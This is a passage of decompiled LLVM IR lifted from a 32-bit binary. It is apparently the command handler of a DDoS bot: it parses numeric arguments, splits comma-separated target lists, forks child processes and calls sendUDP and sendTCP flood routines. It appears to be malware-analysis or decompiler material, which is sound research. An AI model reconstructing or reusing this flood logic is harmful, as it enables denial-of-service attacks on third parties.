  br i1 %v5_804c209, label %dec_label_pc_804c229, label %dec_label_pc_804c20b

dec_label_pc_804c20b:                             ; preds = %dec_label_pc_804c1f2
  %v8_804c20b = icmp ult i32 %tmp115, 7
  store i1 %v8_804c20b, i1* %cf.global-to-local, align 1
  %v12_804c20b = icmp eq i32 %tmp115, 7
  %v1_804c20f = icmp eq i1 %v12_804c20b, false
  br i1 %v1_804c20f, label %dec_label_pc_804c244, label %dec_label_pc_804c211

dec_label_pc_804c211:                             ; preds = %dec_label_pc_804c20b
  %v1_804c214 = add i32 %tmp134, 24
  %v1_804c217 = inttoptr i32 %v1_804c214 to i32*
  %v2_804c217 = load i32, i32* %v1_804c217, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c21d = call i32 @atol(i32 %v2_804c217)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp152 = icmp slt i32 %v1_804c21d, 1
  %tmp153 = icmp eq i1 %tmp152, false
  br i1 %tmp153, label %dec_label_pc_804c244, label %dec_label_pc_804c229

dec_label_pc_804c229:                             ; preds = %dec_label_pc_804c142.dec_label_pc_804c229_crit_edge, %dec_label_pc_804c211, %dec_label_pc_804c1f2, %dec_label_pc_804c1d7, %dec_label_pc_804c1bc, %dec_label_pc_804c1a3, %dec_label_pc_804c186, %dec_label_pc_804c169, %dec_label_pc_804c14c
  %v0_804c22e = phi i32 [ %v0_804c22e.pre, %dec_label_pc_804c142.dec_label_pc_804c229_crit_edge ], [ %v15_804bda4, %dec_label_pc_804c211 ], [ %v15_804bda4, %dec_label_pc_804c1f2 ], [ %v15_804bda4, %dec_label_pc_804c1d7 ], [ %v15_804bda4, %dec_label_pc_804c1bc ], [ %v15_804bda4, %dec_label_pc_804c1a3 ], [ %v15_804bda4, %dec_label_pc_804c186 ], [ %v15_804bda4, %dec_label_pc_804c169 ], [ %v15_804bda4, %dec_label_pc_804c14c ]
  %v0_804c229 = load i32, i32* @global_var_8059b00.18, align 256
  %v5_804c22e = icmp ult i32 %v0_804c22e, 8
  store i1 %v5_804c22e, i1* %cf.global-to-local, align 1
  %v2_804c237 = call i32 @Rootsprintf(i32 %v0_804c229, i32 ptrtoint ([113 x i8]* @global_var_805656c.159 to i32))
  %v0_804c23c = load i32, i32* @esp, align 4
  %v2_804c23c = icmp ugt i32 %v0_804c23c, -17
  store i1 %v2_804c23c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c90d

dec_label_pc_804c244:                             ; preds = %dec_label_pc_804c211, %dec_label_pc_804c20b
  %v1_804c247 = add i32 %tmp134, 4
  %v1_804c24a = inttoptr i32 %v1_804c247 to i32*
  %v2_804c24a = load i32, i32* %v1_804c24a, align 4
  %v2_804c255 = load i32, i32* %v1_804c16f, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c25b = call i32 @atol(i32 %v2_804c255)
  %v2_804c26c = load i32, i32* %v1_804c152, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c272 = call i32 @atol(i32 %v2_804c26c)
  %v2_804c283 = load i32, i32* %v1_804c18c, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c289 = call i32 @atol(i32 %v2_804c283)
  %v2_804c29a = load i32, i32* %v1_804c1a9, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c2a0 = call i32 @atol(i32 %v2_804c29a)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c2af = icmp sgt i32 %tmp115, 6
  br i1 %v7_804c2af, label %dec_label_pc_804c2d7, label %dec_label_pc_804c2d7.thread

dec_label_pc_804c2d7.thread:                      ; preds = %dec_label_pc_804c244
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804c20b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c30c.thread

dec_label_pc_804c2d7:                             ; preds = %dec_label_pc_804c244
  %v1_804c2b4 = add i32 %tmp134, 24
  %v1_804c2b7 = inttoptr i32 %v1_804c2b4 to i32*
  %v2_804c2b7 = load i32, i32* %v1_804c2b7, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c2bd = call i32 @atol(i32 %v2_804c2b7)
  store i32 %v1_804c2bd, i32* @esi, align 4
  store i1 %v8_804c20b, i1* %cf.global-to-local, align 1
  br i1 %v12_804c20b, label %dec_label_pc_804c30c.thread, label %dec_label_pc_804c30c

dec_label_pc_804c30c.thread:                      ; preds = %dec_label_pc_804c2d7, %dec_label_pc_804c2d7.thread
  %storemerge26160.ph = phi i32 [ 1000, %dec_label_pc_804c2d7.thread ], [ %v1_804c2bd, %dec_label_pc_804c2d7 ]
  store i32 1000000, i32* @edi, align 4
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c341

dec_label_pc_804c30c:                             ; preds = %dec_label_pc_804c2d7
  %v1_804c2e9 = add i32 %tmp134, 28
  %v1_804c2ec = inttoptr i32 %v1_804c2e9 to i32*
  %v2_804c2ec = load i32, i32* %v1_804c2ec, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c2f2 = call i32 @atol(i32 %v2_804c2ec)
  store i32 %v1_804c2f2, i32* @edi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c319 = icmp sgt i32 %tmp115, 8
  br i1 %v7_804c319, label %dec_label_pc_804c31b, label %dec_label_pc_804c341

dec_label_pc_804c31b:                             ; preds = %dec_label_pc_804c30c
  %v1_804c31e = add i32 %tmp134, 32
  %v1_804c321 = inttoptr i32 %v1_804c31e to i32*
  %v2_804c321 = load i32, i32* %v1_804c321, align 4
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c327 = call i32 @atol(i32 %v2_804c321)
  %v0_804c32c = load i32, i32* @esp, align 4
  %v2_804c32c = icmp ugt i32 %v0_804c32c, -17
  store i1 %v2_804c32c, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c341

dec_label_pc_804c341:                             ; preds = %dec_label_pc_804c30c.thread, %dec_label_pc_804c30c, %dec_label_pc_804c31b
  %storemerge25165 = phi i32 [ %v1_804c2f2, %dec_label_pc_804c31b ], [ %v1_804c2f2, %dec_label_pc_804c30c ], [ 1000000, %dec_label_pc_804c30c.thread ]
  %storemerge26160164 = phi i32 [ %v1_804c2bd, %dec_label_pc_804c31b ], [ %v1_804c2bd, %dec_label_pc_804c30c ], [ %storemerge26160.ph, %dec_label_pc_804c30c.thread ]
  %storemerge24 = phi i32 [ %v1_804c327, %dec_label_pc_804c31b ], [ 0, %dec_label_pc_804c30c ], [ 0, %dec_label_pc_804c30c.thread ]
  %v5_804c34d = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c34d, i1* %cf.global-to-local, align 1
  %v2_804c353 = inttoptr i32 %v2_804c24a to i8*
  %v3_804c353 = call i32 @__GI_strchr(i8* %v2_804c353, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c35b = icmp eq i32 %v3_804c353, 0
  br i1 %v1_804c35b, label %dec_label_pc_804c3cb, label %dec_label_pc_804c35f

dec_label_pc_804c35f:                             ; preds = %dec_label_pc_804c341
  store i32 %v2_804c24a, i32* @eax, align 4
  store i1 %v5_804c34d, i1* %cf.global-to-local, align 1
  %v2_804c36b = call i32 @__GI_strtok(i32 %v2_804c24a, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c3c0182 = icmp eq i32 %v2_804c36b, 0
  %v1_804c3c4183 = icmp eq i1 %v4_804c3c0182, false
  br i1 %v1_804c3c4183, label %dec_label_pc_804c378, label %dec_label_pc_804c90d

dec_label_pc_804c378:                             ; preds = %dec_label_pc_804c35f, %dec_label_pc_804c3ab
  %storemerge69184 = phi i32 [ %v2_804c3b5, %dec_label_pc_804c3ab ], [ %v2_804c36b, %dec_label_pc_804c35f ]
  %v0_804c378 = call i32 @listFork()
  store i32 %v0_804c378, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c37d = icmp eq i32 %v0_804c378, 0
  %v1_804c37f = icmp eq i1 %v1_804c37d, false
  br i1 %v1_804c37f, label %dec_label_pc_804c3ab, label %dec_label_pc_804c381

dec_label_pc_804c381:                             ; preds = %dec_label_pc_804c378
  %v9_804c399 = call i32 @sendUDP(i32 %storemerge69184, i32 %v1_804c25b, i32 %v1_804c272, i32 %v1_804c289, i32 %v1_804c2a0, i32 %storemerge26160164, i32 %storemerge25165, i32 %storemerge24)
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c3a6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c3ab:                             ; preds = %dec_label_pc_804c378
  %v0_804c3ab = load i32, i32* @esp, align 4
  %v5_804c3ab = icmp ult i32 %v0_804c3ab, 8
  store i1 %v5_804c3ab, i1* %cf.global-to-local, align 1
  %v2_804c3b5 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c3c0 = icmp eq i32 %v2_804c3b5, 0
  %v1_804c3c4 = icmp eq i1 %v4_804c3c0, false
  br i1 %v1_804c3c4, label %dec_label_pc_804c378, label %dec_label_pc_804c90d

dec_label_pc_804c3cb:                             ; preds = %dec_label_pc_804c341
  %v0_804c3cb = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c3d0 = icmp eq i32 %v0_804c3cb, 0
  %v1_804c3d2 = icmp eq i1 %v1_804c3d0, false
  br i1 %v1_804c3d2, label %dec_label_pc_804c90d, label %dec_label_pc_804c3d8

dec_label_pc_804c3d8:                             ; preds = %dec_label_pc_804c3cb
  %v9_804c3f0 = call i32 @sendUDP(i32 %v2_804c24a, i32 %v1_804c25b, i32 %v1_804c272, i32 %v1_804c289, i32 %v1_804c2a0, i32 %storemerge26160164, i32 %storemerge25165, i32 %storemerge24)
  store i1 %v5_804c171, i1* %cf.global-to-local, align 1
  %v1_804c3fd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c402:                             ; preds = %dec_label_pc_804c0f7
  %v2_804c405 = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804c422 = inttoptr i32 %v2_804c405 to i8*
  store i32 %v2_804c405, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80565dd.160 to i32), i32* @edi, align 4
  %v7_804c434 = call i32 @_strncmp(i8* %v4_804c422, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80565dd.160, i32 0, i32 0), i32 4)
  %v8_804c434 = urem i32 %v7_804c434, 2
  %v9_804c434 = icmp eq i32 %v8_804c434, 0
  %v0_804c436 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c436 = or i1 %v0_804c436, %v9_804c434
  %v3_804c436 = zext i1 %v2_804c436 to i32
  %v4_804c436 = load i32, i32* %edx.global-to-local, align 4
  %v5_804c436 = and i32 %v4_804c436, -256
  %v6_804c436 = or i32 %v3_804c436, %v5_804c436
  %v7_804c436 = xor i32 %v6_804c436, 1
  store i32 %v7_804c436, i32* @edx, align 4
  %v1_804c43e = trunc i32 %v7_804c436 to i8
  %v3_804c43e = zext i1 %v0_804c436 to i8
  %v15_804c43e = icmp eq i8 %v1_804c43e, %v3_804c43e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c447 = icmp eq i1 %v15_804c43e, false
  br i1 %v1_804c447, label %dec_label_pc_804c68c, label %dec_label_pc_804c44d

dec_label_pc_804c44d:                             ; preds = %dec_label_pc_804c402
  %v9_804c44d = icmp ult i32 %tmp115, 5
  store i1 %v9_804c44d, i1* %cf.global-to-local, align 1
  %v7_804c451 = icmp sgt i32 %tmp115, 5
  br i1 %v7_804c451, label %dec_label_pc_804c457, label %dec_label_pc_804c44d.dec_label_pc_804c4fb_crit_edge

dec_label_pc_804c44d.dec_label_pc_804c4fb_crit_edge: ; preds = %dec_label_pc_804c44d
  %v0_804c500.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c4fb

dec_label_pc_804c457:                             ; preds = %dec_label_pc_804c44d
  %v1_804c45a = add i32 %tmp134, 12
  %v1_804c45d = inttoptr i32 %v1_804c45a to i32*
  %v2_804c45d = load i32, i32* %v1_804c45d, align 4
  %v0_804c45f = load i32, i32* @esp, align 4
  %v5_804c45f = icmp ult i32 %v0_804c45f, 12
  store i1 %v5_804c45f, i1* %cf.global-to-local, align 1
  %v1_804c463 = call i32 @atol(i32 %v2_804c45d)
  %v5_804c46b = icmp ne i32 %v1_804c463, -1
  store i1 %v5_804c46b, i1* %cf.global-to-local, align 1
  %v10_804c46b = icmp eq i32 %v1_804c463, -1
  br i1 %v10_804c46b, label %dec_label_pc_804c4fb, label %dec_label_pc_804c474

dec_label_pc_804c474:                             ; preds = %dec_label_pc_804c457
  %v1_804c477 = add i32 %tmp134, 8
  %v1_804c47a = inttoptr i32 %v1_804c477 to i32*
  %v2_804c47a = load i32, i32* %v1_804c47a, align 4
  %v5_804c47c = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c480 = call i32 @atol(i32 %v2_804c47a)
  %v5_804c488 = icmp ne i32 %v1_804c480, -1
  store i1 %v5_804c488, i1* %cf.global-to-local, align 1
  %v10_804c488 = icmp eq i32 %v1_804c480, -1
  br i1 %v10_804c488, label %dec_label_pc_804c4fb, label %dec_label_pc_804c48d

dec_label_pc_804c48d:                             ; preds = %dec_label_pc_804c474
  %v1_804c490 = add i32 %tmp134, 16
  %v1_804c493 = inttoptr i32 %v1_804c490 to i32*
  %v2_804c493 = load i32, i32* %v1_804c493, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c499 = call i32 @atol(i32 %v2_804c493)
  %v5_804c4a1 = icmp ne i32 %v1_804c499, -1
  store i1 %v5_804c4a1, i1* %cf.global-to-local, align 1
  %v10_804c4a1 = icmp eq i32 %v1_804c499, -1
  br i1 %v10_804c4a1, label %dec_label_pc_804c4fb, label %dec_label_pc_804c4a6

dec_label_pc_804c4a6:                             ; preds = %dec_label_pc_804c48d
  %v2_804c4ac = load i32, i32* %v1_804c493, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c4b2 = call i32 @atol(i32 %v2_804c4ac)
  %v1_804c4ba = add i32 %v1_804c4b2, -32
  %v2_804c4ba = icmp ult i32 %v1_804c4b2, 32
  %v3_804c4ba = sub i32 31, %v1_804c4b2
  %v4_804c4ba = and i32 %v3_804c4ba, %v1_804c4b2
  %v5_804c4ba = icmp slt i32 %v4_804c4ba, 0
  store i1 %v2_804c4ba, i1* %cf.global-to-local, align 1
  %v6_804c4ba = icmp eq i32 %v1_804c4ba, 0
  %v7_804c4ba = icmp slt i32 %v1_804c4ba, 0
  %v3_804c4bd = icmp eq i1 %v7_804c4ba, %v5_804c4ba
  %v4_804c4bd = icmp eq i1 %v6_804c4ba, false
  %v5_804c4bd = and i1 %v4_804c4bd, %v3_804c4bd
  br i1 %v5_804c4bd, label %dec_label_pc_804c4fb, label %dec_label_pc_804c4bf

dec_label_pc_804c4bf:                             ; preds = %dec_label_pc_804c4a6
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804c4c3 = icmp sgt i32 %tmp115, 6
  br i1 %v7_804c4c3, label %dec_label_pc_804c4c5, label %dec_label_pc_804c4dd.thread

dec_label_pc_804c4dd.thread:                      ; preds = %dec_label_pc_804c4bf
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c516

dec_label_pc_804c4c5:                             ; preds = %dec_label_pc_804c4bf
  %v1_804c4c8 = add i32 %tmp134, 24
  %v1_804c4cb = inttoptr i32 %v1_804c4c8 to i32*
  %v2_804c4cb = load i32, i32* %v1_804c4cb, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c4d1 = call i32 @atol(i32 %v2_804c4cb)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804c4d9 = icmp slt i32 %v1_804c4d1, 0
  br i1 %v2_804c4d9, label %dec_label_pc_804c4fb, label %dec_label_pc_804c4dd

dec_label_pc_804c4dd:                             ; preds = %dec_label_pc_804c4c5
  %v8_804c4dd = icmp ult i32 %tmp115, 8
  store i1 %v8_804c4dd, i1* %cf.global-to-local, align 1
  %v12_804c4dd = icmp eq i32 %tmp115, 8
  %v1_804c4e1 = icmp eq i1 %v12_804c4dd, false
  br i1 %v1_804c4e1, label %dec_label_pc_804c516, label %dec_label_pc_804c4e3

dec_label_pc_804c4e3:                             ; preds = %dec_label_pc_804c4dd
  %v1_804c4e6 = add i32 %tmp134, 28
  %v1_804c4e9 = inttoptr i32 %v1_804c4e6 to i32*
  %v2_804c4e9 = load i32, i32* %v1_804c4e9, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c4ef = call i32 @atol(i32 %v2_804c4e9)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp154 = icmp slt i32 %v1_804c4ef, 1
  %tmp155 = icmp eq i1 %tmp154, false
  br i1 %tmp155, label %dec_label_pc_804c516, label %dec_label_pc_804c4fb

dec_label_pc_804c4fb:                             ; preds = %dec_label_pc_804c44d.dec_label_pc_804c4fb_crit_edge, %dec_label_pc_804c4e3, %dec_label_pc_804c4c5, %dec_label_pc_804c4a6, %dec_label_pc_804c48d, %dec_label_pc_804c474, %dec_label_pc_804c457
  %v0_804c500 = phi i32 [ %v0_804c500.pre, %dec_label_pc_804c44d.dec_label_pc_804c4fb_crit_edge ], [ %v15_804bda4, %dec_label_pc_804c4e3 ], [ %v15_804bda4, %dec_label_pc_804c4c5 ], [ %v15_804bda4, %dec_label_pc_804c4a6 ], [ %v15_804bda4, %dec_label_pc_804c48d ], [ %v15_804bda4, %dec_label_pc_804c474 ], [ %v15_804bda4, %dec_label_pc_804c457 ]
  %v0_804c4fb = load i32, i32* @global_var_8059b00.18, align 256
  %v5_804c500 = icmp ult i32 %v0_804c500, 8
  store i1 %v5_804c500, i1* %cf.global-to-local, align 1
  %v2_804c509 = call i32 @Rootsprintf(i32 %v0_804c4fb, i32 ptrtoint ([186 x i8]* @global_var_80565e4.161 to i32))
  %v0_804c50e = load i32, i32* @esp, align 4
  %v2_804c50e = icmp ugt i32 %v0_804c50e, -17
  store i1 %v2_804c50e, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c90d

dec_label_pc_804c516:                             ; preds = %dec_label_pc_804c4dd.thread, %dec_label_pc_804c4e3, %dec_label_pc_804c4dd
  %v8_804c4dd169 = phi i1 [ true, %dec_label_pc_804c4dd.thread ], [ %v8_804c4dd, %dec_label_pc_804c4e3 ], [ %v8_804c4dd, %dec_label_pc_804c4dd ]
  %v1_804c4e1171 = phi i1 [ true, %dec_label_pc_804c4dd.thread ], [ false, %dec_label_pc_804c4e3 ], [ true, %dec_label_pc_804c4dd ]
  %v1_804c519 = add i32 %tmp134, 4
  %v1_804c51c = inttoptr i32 %v1_804c519 to i32*
  %v2_804c51c = load i32, i32* %v1_804c51c, align 4
  %v2_804c527 = load i32, i32* %v1_804c47a, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c52d = call i32 @atol(i32 %v2_804c527)
  %v2_804c53e = load i32, i32* %v1_804c45d, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c544 = call i32 @atol(i32 %v2_804c53e)
  %v2_804c555 = load i32, i32* %v1_804c493, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c55b = call i32 @atol(i32 %v2_804c555)
  %v1_804c569 = add i32 %tmp134, 20
  %v1_804c56c = inttoptr i32 %v1_804c569 to i32*
  %v2_804c56c = load i32, i32* %v1_804c56c, align 4
  store i1 %v8_804c4dd169, i1* %cf.global-to-local, align 1
  br i1 %v1_804c4e1171, label %dec_label_pc_804c59d, label %dec_label_pc_804c577

dec_label_pc_804c577:                             ; preds = %dec_label_pc_804c516
  %v1_804c57a = add i32 %tmp134, 28
  %v1_804c57d = inttoptr i32 %v1_804c57a to i32*
  %v2_804c57d = load i32, i32* %v1_804c57d, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c583 = call i32 @atol(i32 %v2_804c57d)
  %v0_804c588 = load i32, i32* @esp, align 4
  %v2_804c588 = icmp ugt i32 %v0_804c588, -17
  store i1 %v2_804c588, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c59d

dec_label_pc_804c59d:                             ; preds = %dec_label_pc_804c516, %dec_label_pc_804c577
  %storemerge23 = phi i32 [ %v1_804c583, %dec_label_pc_804c577 ], [ 10, %dec_label_pc_804c516 ]
  store i32 %storemerge23, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804c4c3, label %dec_label_pc_804c5ac, label %dec_label_pc_804c5d2

dec_label_pc_804c5ac:                             ; preds = %dec_label_pc_804c59d
  %v1_804c5af = add i32 %tmp134, 24
  %v1_804c5b2 = inttoptr i32 %v1_804c5af to i32*
  %v2_804c5b2 = load i32, i32* %v1_804c5b2, align 4
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c5b8 = call i32 @atol(i32 %v2_804c5b2)
  %v0_804c5bd = load i32, i32* @esp, align 4
  %v2_804c5bd = icmp ugt i32 %v0_804c5bd, -17
  store i1 %v2_804c5bd, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804c5d2

dec_label_pc_804c5d2:                             ; preds = %dec_label_pc_804c59d, %dec_label_pc_804c5ac
  %storemerge22 = phi i32 [ %v1_804c5b8, %dec_label_pc_804c5ac ], [ 0, %dec_label_pc_804c59d ]
  store i32 %storemerge22, i32* @edi, align 4
  %v5_804c5de = icmp ult i32* %stack_var_-284, inttoptr (i32 8 to i32*)
  store i1 %v5_804c5de, i1* %cf.global-to-local, align 1
  %v2_804c5e4 = inttoptr i32 %v2_804c51c to i8*
  %v3_804c5e4 = call i32 @__GI_strchr(i8* %v2_804c5e4, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c5ec = icmp eq i32 %v3_804c5e4, 0
  br i1 %v1_804c5ec, label %dec_label_pc_804c659, label %dec_label_pc_804c5f0

dec_label_pc_804c5f0:                             ; preds = %dec_label_pc_804c5d2
  store i32 %v2_804c51c, i32* @eax, align 4
  store i1 %v5_804c5de, i1* %cf.global-to-local, align 1
  %v2_804c5fc = call i32 @__GI_strtok(i32 %v2_804c51c, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c651179 = icmp eq i32 %v2_804c5fc, 0
  %v1_804c655180 = icmp eq i1 %v4_804c651179, false
  br i1 %v1_804c655180, label %dec_label_pc_804c609, label %dec_label_pc_804c68c

dec_label_pc_804c609:                             ; preds = %dec_label_pc_804c5f0, %dec_label_pc_804c63c
  %storemerge70181 = phi i32 [ %v2_804c646, %dec_label_pc_804c63c ], [ %v2_804c5fc, %dec_label_pc_804c5f0 ]
  %v0_804c609 = call i32 @listFork()
  store i32 %v0_804c609, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c60e = icmp eq i32 %v0_804c609, 0
  %v1_804c610 = icmp eq i1 %v1_804c60e, false
  %v0_804c63c = load i32, i32* @esp, align 4
  br i1 %v1_804c610, label %dec_label_pc_804c63c, label %dec_label_pc_804c612

dec_label_pc_804c612:                             ; preds = %dec_label_pc_804c609
  %v5_804c612 = icmp ult i32 %v0_804c63c, 4
  store i1 %v5_804c612, i1* %cf.global-to-local, align 1
  %v8_804c62a = inttoptr i32 %v2_804c56c to i8*
  %v9_804c62a = call i32 @sendTCP(i32 %storemerge70181, i32 %v1_804c52d, i32 %v1_804c544, i32 %v1_804c55b, i8* %v8_804c62a, i32 %storemerge22, i32 %storemerge23)
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c637 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c63c:                             ; preds = %dec_label_pc_804c609
  %v5_804c63c = icmp ult i32 %v0_804c63c, 8
  store i1 %v5_804c63c, i1* %cf.global-to-local, align 1
  %v2_804c646 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_80564f1.143 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804c651 = icmp eq i32 %v2_804c646, 0
  %v1_804c655 = icmp eq i1 %v4_804c651, false
  br i1 %v1_804c655, label %dec_label_pc_804c609, label %dec_label_pc_804c68c

dec_label_pc_804c659:                             ; preds = %dec_label_pc_804c5d2
  %v0_804c659 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c65e = icmp eq i32 %v0_804c659, 0
  %v1_804c660 = icmp eq i1 %v1_804c65e, false
  br i1 %v1_804c660, label %dec_label_pc_804c68c, label %dec_label_pc_804c662

dec_label_pc_804c662:                             ; preds = %dec_label_pc_804c659
  %v0_804c662 = load i32, i32* @esp, align 4
  %v5_804c662 = icmp ult i32 %v0_804c662, 4
  store i1 %v5_804c662, i1* %cf.global-to-local, align 1
  %v8_804c67a = inttoptr i32 %v2_804c56c to i8*
  %v9_804c67a = call i32 @sendTCP(i32 %v2_804c51c, i32 %v1_804c52d, i32 %v1_804c544, i32 %v1_804c55b, i8* %v8_804c67a, i32 %storemerge22, i32 %storemerge23)
  store i1 %v5_804c47c, i1* %cf.global-to-local, align 1
  %v1_804c687 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804c68c:                             ; preds = %dec_label_pc_804c5f0, %dec_label_pc_804c63c, %dec_label_pc_804c402, %dec_label_pc_804c659
  %v2_804c68f = load i32, i32* %v1_804bdad, align 4
  store i1 false, i1* @df, align 1
  %v4_804c6ac = inttoptr i32 %v2_804c68f to i8*
  store i32 %v2_804c68f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805669e.162 to i32), i32* @edi, align 4
  %v7_804c6be = call i32 @_strncmp(i8* %v4_804c6ac, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805669e.162, i32 0, i32 0), i32 4)
  %v8_804c6be = urem i32 %v7_804c6be, 2
  %v9_804c6be = icmp eq i32 %v8_804c6be, 0
  %v0_804c6c0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804c6c0 = or i1 %v0_804c6c0, %v9_804c6be
  %v3_804c6c0 = zext i1 %v2_804c6c0 to i32
  %v4_804c6c0 = load i32, i32* @edx, align 4
  %v5_804c6c0 = and i32 %v4_804c6c0, -256
  %v6_804c6c0 = or i32 %v3_804c6c0, %v5_804c6c0
  %v7_804c6c0 = xor i32 %v6_804c6c0, 1
  store i32 %v7_804c6c0, i32* @edx, align 4
  %v1_804c6c8 = trunc i32 %v7_804c6c0 to i8
  %v3_804c6c8 = zext i1 %v0_804c6c0 to i8
  %v15_804c6c8 = icmp eq i8 %v1_804c6c8, %v3_804c6c8
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804c6d1 = icmp eq i1 %v15_804c6c8, false
  br i1 %v1_804c6d1, label %dec_label_pc_804c7fe, label %dec_label_pc_804c6d7

dec_label_pc_804c6d7:                             ; preds = %dec_label_pc_804c68c
  %v9_804c6d7 = icmp ult i32 %tmp115, 3
  store i1 %v9_804c6d7, i1* %cf.global-to-local, align 1
  %v7_804c6db = icmp sgt i32 %tmp115, 3
  br i1 %v7_804c6db, label %dec_label_pc_804c6dd, label %dec_label_pc_804c6d7.dec_label_pc_804c70d_crit_edge

dec_label_pc_804c6d7.dec_label_pc_804c70d_crit_edge: ; preds = %dec_label_pc_804c6d7
  %v0_804c712.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c70d

dec_label_pc_804c6dd:                             ; preds = %dec_label_pc_804c6d7
  %v1_804c6e0 = add i32 %tmp134, 8
  %v1_804c6e3 = inttoptr i32 %v1_804c6e0 to i32*
  %v2_804c6e3 = load i32, i32* %v1_804c6e3, align 4
  %v0_804c6e5 = load i32, i32* @esp, align 4
  %v5_804c6e5 = icmp ult i32 %v0_804c6e5, 12
  store i1 %v5_804c6e5, i1* %cf.global-to-local, align 1
  %v1_804c6e9 = call i32 @atol(i32 %v2_804c6e3)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp156 = icmp slt i32 %v1_804c6e9, 1
  br i1 %tmp156, label %dec_label_pc_804c70d, label %dec_label_pc_804c6f5

dec_label_pc_804c6f5:                             ; preds = %dec_label_pc_804c6dd
  %v1_804c6f8 = add i32 %tmp134, 12
  %v1_804c6fb = inttoptr i32 %v1_804c6f8 to i32*
  %v2_804c6fb = load i32, i32* %v1_804c6fb, align 4
  %v5_804c6fd = icmp ult i32* %stack_var_-284, inttoptr (i32 12 to i32*)
  store i1 %v5_804c6fd, i1* %cf.global-to-local, align 1
  %v1_804c701 = call i32 @atol(i32 %v2_804c6fb)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp157 = icmp slt i32 %v1_804c701, 1
  %tmp158 = icmp eq i1 %tmp157, false
  br i1 %tmp158, label %dec_label_pc_804c728, label %dec_label_pc_804c70d

dec_label_pc_804c70d:                             ; preds = %dec_label_pc_804c6d7.dec_label_pc_804c70d_crit_edge, %dec_label_pc_804c6f5, %dec_label_pc_804c6dd
  %v0_804c712 = phi i32 [ %v0_804c712.pre, %dec_label_pc_804c6d7.dec_label_pc_804c70d_crit_edge ], [ %v15_804bda4, %dec_label_pc_804c6f5 ], [ %v15_804bda4, %dec_label_pc_804c6dd ]
  %v0_804c70d = load i32, i32* @global_var_8059b00.18, align 256
